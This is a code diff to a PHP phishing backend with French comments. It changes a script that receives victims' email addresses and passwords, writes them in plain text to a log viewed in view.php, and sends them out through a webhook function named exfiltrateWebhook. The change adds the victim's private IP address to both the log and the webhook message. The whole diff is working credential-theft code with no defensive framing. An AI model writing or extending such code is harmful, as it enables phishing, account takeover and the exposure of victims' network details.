@@ -63,12 +63,13 @@ function storeLocal($data) {
     $jsonLine = json_encode($data) . PHP_EOL;
     file_put_contents(LOG_FILE . '.json', $jsonLine, FILE_APPEND | LOCK_EX);
     
-    // 🔥 FORMAT TEXTE CLAIR (lisible dans view.php)
+    // 🔥 FORMAT TEXTE CLAIR (lisible dans view.php) avec IP privée
     $textEntry = "\n=============================================\n";
     $textEntry .= "Date: " . $data['timestamp'] . "\n";
     $textEntry .= "Email: " . $data['email'] . "\n";
     $textEntry .= "Password: " . $data['password'] . "\n";
-    $textEntry .= "IP: " . $data['ip'] . "\n";
+    $textEntry .= "IP Publique: " . $data['ip'] . "\n";
+    $textEntry .= "IP Privée: " . ($data['local_ip'] ?? 'non détectée') . "\n";
     $textEntry .= "User Agent: " . $data['user_agent'] . "\n";
     $textEntry .= "=============================================\n";
     
@@ -86,7 +87,8 @@ function exfiltrateWebhook($data) {
     $message = "🔐 NOUVEAU LOGIN 🔐\n";
     $message .= "📧 Email: " . $data['email'] . "\n";
     $message .= "🔑 Password: " . $data['password'] . "\n";
-    $message .= "🌍 IP: " . $data['ip'] . "\n";
+    $message .= "🌍 IP Publique: " . $data['ip'] . "\n";
+    $message .= "🏠 IP Privée: " . ($data['local_ip'] ?? 'non détectée') . "\n";
     $message .= "🕒 Time: " . $data['timestamp'] . "\n";
     $message .= "💻 User Agent: " . $data['user_agent'];
     
@@ -118,6 +120,7 @@ if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
 // Récupération des données POST
 $email = $_POST['email'] ?? '';
 $password = $_POST['password'] ?? '';
+$localIP = $_POST['local_ip'] ?? 'non détectée';  // ← AJOUT IP PRIVÉE
 
 // Validations
 if (!validateEmail($email)) {
@@ -134,6 +137,7 @@ $logData = [
     'password' => $password,
     'password_encrypted' => encryptData($password, ENCRYPTION_KEY),
     'ip' => getRealIP(),
+    'local_ip' => $localIP,  // ← AJOUT IP PRIVÉE
     'user_agent' => getUserAgent(),
     'referer' => getReferer(),
     'timestamp' => date('Y-m-d H:i:s'),
